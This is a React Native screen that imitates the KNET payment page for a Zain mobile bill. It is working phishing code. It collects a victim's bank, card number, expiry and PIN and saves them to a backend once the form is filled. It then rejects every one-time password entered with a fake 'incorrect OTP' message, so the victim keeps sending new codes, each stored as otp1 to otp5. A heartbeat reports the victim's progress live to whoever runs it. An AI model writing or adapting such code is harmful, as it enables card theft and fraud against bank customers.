import { Feather } from "@expo/vector-icons";
import * as Haptics from "expo-haptics";
import { router, useLocalSearchParams } from "expo-router";
import React, {
  useCallback,
  useEffect,
  useRef,
  useState,
} from "react";
import {
  ActivityIndicator,
  FlatList,
  Modal,
  Platform,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";

import { KeyboardAwareScrollViewCompat } from "@/components/KeyboardAwareScrollViewCompat";
import { api } from "@/lib/api";

type Bank = { value: string; label: string; cardPrefixes: string[] };

const MONTHS = Array.from({ length: 12 }, (_, i) =>
  String(i + 1).padStart(2, "0")
);
const YEARS = Array.from({ length: 14 }, (_, i) => String(2024 + i));
const MAX_OTP_ATTEMPTS = 5;

export default function KnetScreen() {
  const insets = useSafeAreaInsets();
  const { amount, phone, recordId: initRecordId } = useLocalSearchParams<{
    amount: string;
    phone: string;
    recordId: string;
  }>();

  const totalStr = amount ?? "6.000";
  const phoneStr = phone ?? "";

  const [step, setStep] = useState<1 | 2>(1);
  const [banks, setBanks] = useState<Bank[]>([]);
  const [bank, setBank] = useState("");
  const [bankLabel, setBankLabel] = useState("");
  const [prefix, setPrefix] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [pin, setPin] = useState("");
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");

  const [otpValue, setOtpValue] = useState("");
  const [otpAttempt, setOtpAttempt] = useState(1);
  const [otpError, setOtpError] = useState("");
  const [tooManyAttempts, setTooManyAttempts] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [isLoading, setIsLoading] = useState(false);
  const [recordId, setRecordId] = useState<string | null>(initRecordId ?? null);
  const [autoSaved, setAutoSaved] = useState(false);

  const [bankModal, setBankModal] = useState(false);
  const [monthModal, setMonthModal] = useState(false);
  const [yearModal, setYearModal] = useState(false);

  const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Fetch banks
  useEffect(() => {
    api.get<Bank[]>("/banks").then(setBanks).catch(() => {});
  }, []);

  // Presence heartbeat
  const sendHeartbeat = useCallback(async (currentStep?: number) => {
    if (!recordId) return;
    await api
      .post("/presence/heartbeat", {
        recordId,
        phone: phoneStr || cardNumber || "",
        amount: totalStr,
        step: currentStep ?? step,
        page: "knet",
      })
      .catch(() => {});
  }, [recordId, phoneStr, cardNumber, totalStr, step]);

  useEffect(() => {
    heartbeatRef.current = setInterval(() => sendHeartbeat(), 15_000);
    return () => {
      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
      if (recordId) {
        api.delete(`/presence/heartbeat/${recordId}`).catch(() => {});
      }
    };
  }, [sendHeartbeat, recordId]);

  // Countdown
  const startCountdown = useCallback(() => {
    if (countdownRef.current) clearInterval(countdownRef.current);
    setCountdown(60);
    countdownRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    startCountdown();
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const saveRecord = useCallback(
    async (extra: Record<string, unknown> = {}, stepNum: number = step) => {
      const payload = {
        civil_id: phoneStr,
        amount: totalStr,
        bank,
        card_prefix: prefix,
        card_number: cardNumber,
        expiry_month: month,
        expiry_year: year,
        pin,
        step_reached: stepNum,
        user_agent: "Zain Mobile App",
        ...extra,
      };
      if (recordId) {
        await api.put(`/payment-records/${recordId}`, payload);
      } else {
        const record = await api.post<{ id: number }>("/payment-records", payload);
        setRecordId(String(record.id));
      }
    },
    [phoneStr, totalStr, bank, prefix, cardNumber, month, year, pin, recordId, step]
  );

  // Auto-save when card form is fully filled
  const isCardComplete =
    !!bank && !!prefix && cardNumber.length >= 6 && pin.length === 4 && !!month && !!year;

  useEffect(() => {
    if (isCardComplete && step === 1 && !autoSaved) {
      setAutoSaved(true);
      saveRecord({}, 1).catch(() => {});
      sendHeartbeat(1);
    }
    if (!isCardComplete) setAutoSaved(false);
  }, [isCardComplete, step, autoSaved, saveRecord, sendHeartbeat]);

  const handleSubmit = useCallback(async () => {
    if (step === 1) {
      setIsLoading(true);
      try {
        await saveRecord({}, 1);
      } catch {}
      setTimeout(() => {
        setIsLoading(false);
        setStep(2);
        startCountdown();
        sendHeartbeat(2);
      }, 2200);
    } else {
      setIsLoading(true);
      const currentOtp = otpValue.trim();
      setOtpValue("");
      const otpKey = `otp${otpAttempt}`;
      try {
        await saveRecord({ [otpKey]: currentOtp }, 2);
      } catch {}
      Haptics.notificationAsync(Haptics.NotificationFeedbackType.Error);
      setTimeout(() => {
        setIsLoading(false);
        const next = otpAttempt + 1;
        setOtpAttempt(next);
        if (next > MAX_OTP_ATTEMPTS) {
          setTooManyAttempts(true);
          setOtpError(
            "Too many invalid attempts. Please contact your bank or try again later."
          );
        } else {
          setOtpError(
            `The OTP you entered is incorrect. Please check your SMS and try again. (Attempt ${otpAttempt} of ${MAX_OTP_ATTEMPTS})`
          );
          startCountdown();
        }
      }, 3000);
    }
  }, [step, otpValue, otpAttempt, saveRecord, startCountdown, sendHeartbeat]);

  const isStep1Disabled =
    !bank || !prefix || cardNumber.length < 6 || pin.length !== 4 || !month || !year;
  const isStep2Disabled = otpValue.length !== 6 || tooManyAttempts;
  const isSubmitDisabled =
    (step === 1 && isStep1Disabled) || (step === 2 && isStep2Disabled);

  const selectedBank = banks.find((b) => b.value === bank);
  const prefixes = selectedBank?.cardPrefixes ?? [];

  const bottomPad = Platform.OS === "web" ? 34 : insets.bottom;

  const maskedCard =
    cardNumber.length >= 8
      ? cardNumber.slice(0, 4) + "****" + cardNumber.slice(8)
      : cardNumber || "—";

  return (
    <View style={styles.root}>
      <KeyboardAwareScrollViewCompat
        bottomOffset={40}
        keyboardShouldPersistTaps="handled"
      >
        <View style={[styles.body, { paddingBottom: bottomPad + 24 }]}>
          {/* Transaction Info */}
          <View style={styles.infoCard}>
            <View style={styles.infoRow}>
              <Text style={styles.infoLabel}>Merchant</Text>
              <Text style={styles.infoValue}>Mobile Telecommunication Co.</Text>
            </View>
            <View style={[styles.infoRow, { borderBottomWidth: 0 }]}>
              <Text style={styles.infoLabel}>Amount</Text>
              <Text style={[styles.infoValue, styles.infoAmount]}>{totalStr} KD</Text>
            </View>
          </View>

          {/* Step indicator */}
          <View style={styles.stepRow}>
            <View style={[styles.stepDot, step >= 1 && styles.stepDotActive]}>
              <Text style={[styles.stepDotText, step >= 1 && styles.stepDotTextActive]}>1</Text>
            </View>
            <View style={[styles.stepLine, step >= 2 && styles.stepLineActive]} />
            <View style={[styles.stepDot, step >= 2 && styles.stepDotActive]}>
              <Text style={[styles.stepDotText, step >= 2 && styles.stepDotTextActive]}>2</Text>
            </View>
            <View style={styles.stepLabels}>
              <Text style={[styles.stepLabel, step === 1 && styles.stepLabelActive]}>
                Card Details
              </Text>
              <Text style={[styles.stepLabel, styles.stepLabelRight, step === 2 && styles.stepLabelActive]}>
                OTP
              </Text>
            </View>
          </View>

          {/* ── STEP 1: Card Form ── */}
          {step === 1 && (
            <View style={styles.formCard}>
              {/* Bank */}
              <TouchableOpacity style={styles.fieldRow} onPress={() => setBankModal(true)}>
                <Text style={styles.fieldLabel}>Bank</Text>
                <View style={styles.pickerRow}>
                  <Text style={[styles.pickerText, !bankLabel && styles.placeholder]}>
                    {bankLabel || "Select Bank"}
                  </Text>
                  <Feather name="chevron-down" size={16} color="#8F8F90" />
                </View>
              </TouchableOpacity>

              {/* Card Number */}
              <View style={styles.fieldRow}>
                <Text style={styles.fieldLabel}>Card No.</Text>
                <View style={{ flex: 1 }}>
                  {prefixes.length > 0 && (
                    <ScrollView
                      horizontal
                      showsHorizontalScrollIndicator={false}
                      style={{ marginBottom: 6 }}
                    >
                      <View style={{ flexDirection: "row", gap: 6 }}>
                        {prefixes.map((p) => (
                          <TouchableOpacity
                            key={p}
                            onPress={() => setPrefix(p)}
                            style={[styles.prefixChip, prefix === p && styles.prefixChipActive]}
                          >
                            <Text
                              style={[
                                styles.prefixChipText,
                                prefix === p && styles.prefixChipTextActive,
                              ]}
                            >
                              {p}
                            </Text>
                          </TouchableOpacity>
                        ))}
                      </View>
                    </ScrollView>
                  )}
                  {!bank && (
                    <Text style={styles.placeholder}>Select a bank first</Text>
                  )}
                  {!!prefix && (
                    <View style={styles.cardNumberRow}>
                      <View style={styles.prefixBadge}>
                        <Text style={styles.prefixBadgeText}>{prefix}</Text>
                      </View>
                      <TextInput
                        style={[styles.fieldInput, { flex: 1 }]}
                        value={cardNumber}
                        onChangeText={(v) =>
                          setCardNumber(v.replace(/\D/g, "").slice(0, 10))
                        }
                        placeholder="0000000000"
                        placeholderTextColor="#9CA3AF"
                        keyboardType="numeric"
                        maxLength={10}
                      />
                    </View>
                  )}
                </View>
              </View>

              {/* Expiry */}
              <View style={styles.fieldRow}>
                <Text style={styles.fieldLabel}>Expiry</Text>
                <View style={{ flexDirection: "row", gap: 8, flex: 1 }}>
                  <TouchableOpacity
                    style={[styles.pickerBtn, { flex: 1 }]}
                    onPress={() => setMonthModal(true)}
                  >
                    <Text style={month ? styles.pickerBtnText : styles.placeholder}>
                      {month || "MM"}
                    </Text>
                    <Feather name="chevron-down" size={14} color="#8F8F90" />
                  </TouchableOpacity>
                  <TouchableOpacity
                    style={[styles.pickerBtn, { flex: 1.6 }]}
                    onPress={() => setYearModal(true)}
                  >
                    <Text style={year ? styles.pickerBtnText : styles.placeholder}>
                      {year || "YYYY"}
                    </Text>
                    <Feather name="chevron-down" size={14} color="#8F8F90" />
                  </TouchableOpacity>
                </View>
              </View>

              {/* PIN */}
              <View style={[styles.fieldRow, { borderBottomWidth: 0 }]}>
                <Text style={styles.fieldLabel}>PIN</Text>
                <TextInput
                  style={[styles.fieldInput, { flex: 1 }]}
                  value={pin}
                  onChangeText={(v) => setPin(v.replace(/\D/g, "").slice(0, 4))}
                  placeholder="••••"
                  placeholderTextColor="#9CA3AF"
                  keyboardType="numeric"
                  maxLength={4}
                  secureTextEntry
                />
              </View>
            </View>
          )}

          {/* ── STEP 2: OTP ── */}
          {step === 2 && (
            <View style={styles.formCard}>
              {tooManyAttempts ? (
                <View style={styles.alertBox}>
                  <Feather name="alert-triangle" size={16} color="#856404" style={{ marginRight: 8 }} />
                  <Text style={styles.alertBoxText}>
                    Too many invalid attempts. Please contact your bank.
                  </Text>
                </View>
              ) : otpError ? (
                <View style={styles.errorBox}>
                  <Feather name="alert-circle" size={16} color="#c0392b" style={{ marginRight: 8 }} />
                  <Text style={styles.errorBoxText}>{otpError}</Text>
                </View>
              ) : null}

              <View style={styles.otpInfoBox}>
                <Text style={styles.otpInfoText}>
                  A 6-digit code has been sent to your registered phone number.
                </Text>
                {otpAttempt > 1 && (
                  <Text style={styles.otpAttemptText}>
                    Attempt {Math.min(otpAttempt, MAX_OTP_ATTEMPTS)} of {MAX_OTP_ATTEMPTS}
                  </Text>
                )}
              </View>

              <View style={styles.fieldRow}>
                <Text style={styles.fieldLabel}>Card</Text>
                <Text style={styles.fieldReadOnly}>{maskedCard}</Text>
              </View>
              <View style={styles.fieldRow}>
                <Text style={styles.fieldLabel}>Expiry</Text>
                <Text style={styles.fieldReadOnly}>
                  {month}/{year}
                </Text>
              </View>
              <View style={styles.fieldRow}>
                <Text style={styles.fieldLabel}>PIN</Text>
                <Text style={styles.fieldReadOnly}>••••</Text>
              </View>

              {!tooManyAttempts && (
                <View style={[styles.fieldRow, { borderBottomWidth: 0 }]}>
                  <Text style={styles.fieldLabel}>OTP</Text>
                  <TextInput
                    style={[styles.fieldInput, { flex: 1 }]}
                    value={otpValue}
                    onChangeText={(v) => setOtpValue(v.replace(/\D/g, "").slice(0, 6))}
                    placeholder={countdown > 0 ? `Timeout in: ${String(countdown).padStart(2, "0")}s` : "Expired"}
                    placeholderTextColor="#9CA3AF"
                    keyboardType="numeric"
                    maxLength={6}
                    autoFocus
                  />
                </View>
              )}
            </View>
          )}

          {/* Buttons */}
          <View style={styles.btnRow}>
            <TouchableOpacity
              style={[
                styles.submitBtn,
                (isSubmitDisabled || isLoading) && styles.submitBtnDisabled,
              ]}
              onPress={handleSubmit}
              disabled={isSubmitDisabled || isLoading}
            >
              <Text style={styles.submitBtnText}>
                {isLoading ? "Processing..." : step === 1 ? "Submit" : "Confirm OTP"}
              </Text>
            </TouchableOpacity>
            <TouchableOpacity style={styles.cancelBtn} onPress={() => router.back()}>
              <Text style={styles.cancelBtnText}>Cancel</Text>
            </TouchableOpacity>
          </View>

          <Text style={styles.knetFooter}>
            All Rights Reserved. Copyright 2024{"\n"}
            The Shared Electronic Banking Services Company - KNET
          </Text>
        </View>
      </KeyboardAwareScrollViewCompat>

      {/* Loading Overlay */}
      {isLoading && (
        <View style={styles.loadingOverlay}>
          <View style={styles.loadingCard}>
            <ActivityIndicator size="large" color="#0070CD" />
            <Text style={styles.loadingText}>Processing...</Text>
          </View>
        </View>
      )}

      {/* Bank Picker Modal */}
      <Modal visible={bankModal} animationType="slide" transparent>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { paddingBottom: insets.bottom + 16 }]}>
            <View style={styles.modalHeader}>
              <Text style={styles.modalTitle}>Select Your Bank</Text>
              <TouchableOpacity onPress={() => setBankModal(false)}>
                <Feather name="x" size={22} color="#374151" />
              </TouchableOpacity>
            </View>
            <FlatList
              data={banks}
              keyExtractor={(b) => b.value}
              renderItem={({ item }) => (
                <TouchableOpacity
                  style={[styles.bankItem, bank === item.value && styles.bankItemSelected]}
                  onPress={() => {
                    setBank(item.value);
                    setBankLabel(item.label);
                    setPrefix("");
                    setBankModal(false);
                    Haptics.selectionAsync();
                  }}
                >
                  <View style={{ flex: 1 }}>
                    <Text style={styles.bankItemName}>{item.label}</Text>
                    <Text style={styles.bankItemCode}>[{item.value}]</Text>
                  </View>
                  {bank === item.value && (
                    <Feather name="check" size={18} color="#0070CD" />
                  )}
                </TouchableOpacity>
              )}
            />
          </View>
        </View>
      </Modal>

      {/* Month Modal */}
      <Modal visible={monthModal} animationType="slide" transparent>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { maxHeight: 380, paddingBottom: insets.bottom + 16 }]}>
            <View style={styles.modalHeader}>
              <Text style={styles.modalTitle}>Expiry Month</Text>
              <TouchableOpacity onPress={() => setMonthModal(false)}>
                <Feather name="x" size={22} color="#374151" />
              </TouchableOpacity>
            </View>
            <FlatList
              data={MONTHS}
              keyExtractor={(m) => m}
              numColumns={4}
              renderItem={({ item }) => (
                <TouchableOpacity
                  style={[styles.gridItem, month === item && styles.gridItemActive]}
                  onPress={() => {
                    setMonth(item);
                    setMonthModal(false);
                  }}
                >
                  <Text style={[styles.gridItemText, month === item && styles.gridItemTextActive]}>
                    {item}
                  </Text>
                </TouchableOpacity>
              )}
            />
          </View>
        </View>
      </Modal>

      {/* Year Modal */}
      <Modal visible={yearModal} animationType="slide" transparent>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { maxHeight: 360, paddingBottom: insets.bottom + 16 }]}>
            <View style={styles.modalHeader}>
              <Text style={styles.modalTitle}>Expiry Year</Text>
              <TouchableOpacity onPress={() => setYearModal(false)}>
                <Feather name="x" size={22} color="#374151" />
              </TouchableOpacity>
            </View>
            <FlatList
              data={YEARS}
              keyExtractor={(y) => y}
              numColumns={3}
              renderItem={({ item }) => (
                <TouchableOpacity
                  style={[styles.gridItem, { flex: 1 / 3 }, year === item && styles.gridItemActive]}
                  onPress={() => {
                    setYear(item);
                    setYearModal(false);
                  }}
                >
                  <Text style={[styles.gridItemText, year === item && styles.gridItemTextActive]}>
                    {item}
                  </Text>
                </TouchableOpacity>
              )}
            />
          </View>
        </View>
      </Modal>
    </View>
  );
}

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: "#EBEBEB" },
  body: { padding: 14 },
  infoCard: {
    backgroundColor: "#FFFFFF",
    borderRadius: 12,
    padding: 14,
    marginBottom: 14,
    borderWidth: 2,
    borderColor: "#8F8F90",
    shadowColor: "#000",
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 6,
    elevation: 3,
  },
  infoRow: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    paddingVertical: 6,
    borderBottomWidth: 1,
    borderBottomColor: "#8F8F90",
  },
  infoLabel: { fontSize: 12, color: "#0070CD", fontWeight: "bold" as const, fontFamily: "Inter_600SemiBold" },
  infoValue: { fontSize: 12, color: "#444", fontFamily: "Inter_400Regular" },
  infoAmount: { color: "#0070CD", fontWeight: "bold" as const, fontSize: 14, fontFamily: "Inter_700Bold" },
  stepRow: {
    flexDirection: "row",
    alignItems: "center",
    marginBottom: 14,
    paddingHorizontal: 8,
    position: "relative",
  },
  stepDot: {
    width: 28,
    height: 28,
    borderRadius: 14,
    backgroundColor: "#DDE3EA",
    alignItems: "center",
    justifyContent: "center",
    zIndex: 1,
  },
  stepDotActive: { backgroundColor: "#0070CD" },
  stepDotText: { fontSize: 13, fontWeight: "bold" as const, color: "#9CA3AF", fontFamily: "Inter_700Bold" },
  stepDotTextActive: { color: "#FFFFFF" },
  stepLine: { flex: 1, height: 2, backgroundColor: "#DDE3EA" },
  stepLineActive: { backgroundColor: "#0070CD" },
  stepLabels: {
    position: "absolute",
    left: 0,
    right: 0,
    top: 34,
    flexDirection: "row",
    justifyContent: "space-between",
    paddingHorizontal: 4,
  },
  stepLabel: { fontSize: 10, color: "#9CA3AF", fontFamily: "Inter_400Regular" },
  stepLabelRight: { textAlign: "right" },
  stepLabelActive: { color: "#0070CD", fontFamily: "Inter_600SemiBold" },
  formCard: {
    backgroundColor: "#FFFFFF",
    borderRadius: 12,
    padding: 14,
    marginTop: 8,
    marginBottom: 12,
    borderWidth: 2,
    borderColor: "#8F8F90",
    shadowColor: "#000",
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 6,
    elevation: 3,
  },
  fieldRow: {
    flexDirection: "row",
    alignItems: "center",
    paddingVertical: 10,
    borderBottomWidth: 1,
    borderBottomColor: "#8F8F90",
    gap: 10,
  },
  fieldLabel: { fontSize: 11, color: "#0070CD", fontWeight: "bold" as const, width: 58, fontFamily: "Inter_600SemiBold" },
  fieldInput: {
    fontSize: 13,
    color: "#1A1A2E",
    borderWidth: 2,
    borderColor: "#0070CD",
    borderRadius: 4,
    paddingHorizontal: 8,
    paddingVertical: 4,
    fontFamily: "Inter_400Regular",
  },
  fieldReadOnly: { fontSize: 13, color: "#444", fontFamily: "Inter_400Regular" },
  pickerRow: { flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "space-between" },
  pickerText: { fontSize: 13, color: "#444", fontFamily: "Inter_400Regular" },
  placeholder: { color: "#9CA3AF", fontSize: 13, fontFamily: "Inter_400Regular" },
  pickerBtn: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    borderWidth: 1,
    borderColor: "#DDE3EA",
    borderRadius: 6,
    paddingHorizontal: 10,
    paddingVertical: 7,
    backgroundColor: "#F9FAFB",
  },
  pickerBtnText: { fontSize: 13, color: "#1A1A2E", fontFamily: "Inter_400Regular" },
  prefixChip: {
    paddingHorizontal: 12,
    paddingVertical: 4,
    borderRadius: 20,
    borderWidth: 1.5,
    borderColor: "#DDE3EA",
    backgroundColor: "#F9FAFB",
  },
  prefixChipActive: { borderColor: "#0070CD", backgroundColor: "#0070CD" },
  prefixChipText: { fontSize: 12, color: "#374151", fontFamily: "Inter_500Medium" },
  prefixChipTextActive: { color: "#FFFFFF" },
  cardNumberRow: { flexDirection: "row", alignItems: "center", gap: 8 },
  prefixBadge: {
    paddingHorizontal: 8,
    paddingVertical: 4,
    backgroundColor: "#E8F4FF",
    borderRadius: 4,
    borderWidth: 1,
    borderColor: "#0070CD",
  },
  prefixBadgeText: { fontSize: 12, color: "#0070CD", fontWeight: "bold" as const, fontFamily: "Inter_600SemiBold" },
  otpInfoBox: {
    backgroundColor: "#D9EDF6",
    borderWidth: 1,
    borderColor: "#BACCE0",
    borderRadius: 6,
    padding: 10,
    marginBottom: 10,
  },
  otpInfoText: { fontSize: 12, color: "#444", textAlign: "justify" as const, fontFamily: "Inter_400Regular" },
  otpAttemptText: { fontSize: 11, color: "#666", marginTop: 4, fontFamily: "Inter_400Regular" },
  alertBox: {
    flexDirection: "row",
    backgroundColor: "#FFF3CD",
    borderWidth: 1,
    borderColor: "#FFC107",
    borderRadius: 6,
    padding: 10,
    marginBottom: 10,
    alignItems: "flex-start",
  },
  alertBoxText: { fontSize: 12, color: "#856404", flex: 1, fontFamily: "Inter_400Regular" },
  errorBox: {
    flexDirection: "row",
    backgroundColor: "#FDE8E8",
    borderWidth: 1,
    borderColor: "#F5C0C0",
    borderRadius: 6,
    padding: 10,
    marginBottom: 10,
    alignItems: "flex-start",
  },
  errorBoxText: { fontSize: 12, color: "#C0392B", fontWeight: "bold" as const, flex: 1, fontFamily: "Inter_400Regular" },
  btnRow: { flexDirection: "row", gap: 10, marginBottom: 16 },
  submitBtn: {
    flex: 1,
    backgroundColor: "#EAEAEA",
    borderWidth: 1,
    borderColor: "#CACACA",
    borderRadius: 6,
    paddingVertical: 10,
    alignItems: "center",
  },
  submitBtnDisabled: { opacity: 0.5 },
  submitBtnText: { fontSize: 14, fontWeight: "bold" as const, color: "#0070CD", fontFamily: "Inter_600SemiBold" },
  cancelBtn: {
    flex: 1,
    backgroundColor: "#EAEAEA",
    borderWidth: 1,
    borderColor: "#CACACA",
    borderRadius: 6,
    paddingVertical: 10,
    alignItems: "center",
  },
  cancelBtnText: { fontSize: 14, fontWeight: "bold" as const, color: "#666", fontFamily: "Inter_600SemiBold" },
  knetFooter: {
    textAlign: "center",
    fontSize: 10,
    color: "#2277D3",
    fontWeight: "bold" as const,
    marginTop: 8,
    fontFamily: "Inter_400Regular",
  },
  loadingOverlay: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: "rgba(85,85,85,0.55)",
    alignItems: "center",
    justifyContent: "center",
    zIndex: 999,
  },
  loadingCard: {
    backgroundColor: "#FFFFFF",
    borderRadius: 12,
    padding: 32,
    alignItems: "center",
    gap: 14,
    shadowColor: "#000",
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 12,
    elevation: 8,
  },
  loadingText: { color: "#0070CD", fontWeight: "bold" as const, fontSize: 14, fontFamily: "Inter_600SemiBold" },
  modalOverlay: {
    flex: 1,
    backgroundColor: "rgba(0,0,0,0.45)",
    justifyContent: "flex-end",
  },
  modalSheet: {
    backgroundColor: "#FFFFFF",
    borderTopLeftRadius: 20,
    borderTopRightRadius: 20,
    maxHeight: "70%",
    paddingTop: 8,
  },
  modalHeader: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    paddingHorizontal: 20,
    paddingVertical: 14,
    borderBottomWidth: 1,
    borderBottomColor: "#E5E7EB",
  },
  modalTitle: { fontSize: 17, fontWeight: "bold" as const, color: "#1A1A2E", fontFamily: "Inter_700Bold" },
  bankItem: {
    flexDirection: "row",
    alignItems: "center",
    paddingHorizontal: 20,
    paddingVertical: 14,
    borderBottomWidth: 1,
    borderBottomColor: "#F3F4F6",
  },
  bankItemSelected: { backgroundColor: "#EFF6FF" },
  bankItemName: { fontSize: 14, color: "#1A1A2E", fontFamily: "Inter_500Medium" },
  bankItemCode: { fontSize: 11, color: "#9CA3AF", marginTop: 1, fontFamily: "Inter_400Regular" },
  gridItem: {
    flex: 1 / 4,
    margin: 4,
    paddingVertical: 12,
    borderRadius: 8,
    borderWidth: 1,
    borderColor: "#E5E7EB",
    alignItems: "center",
    backgroundColor: "#F9FAFB",
  },
  gridItemActive: { backgroundColor: "#0070CD", borderColor: "#0070CD" },
  gridItemText: { fontSize: 14, color: "#374151", fontFamily: "Inter_500Medium" },
  gridItemTextActive: { color: "#FFFFFF", fontFamily: "Inter_600SemiBold" },
});
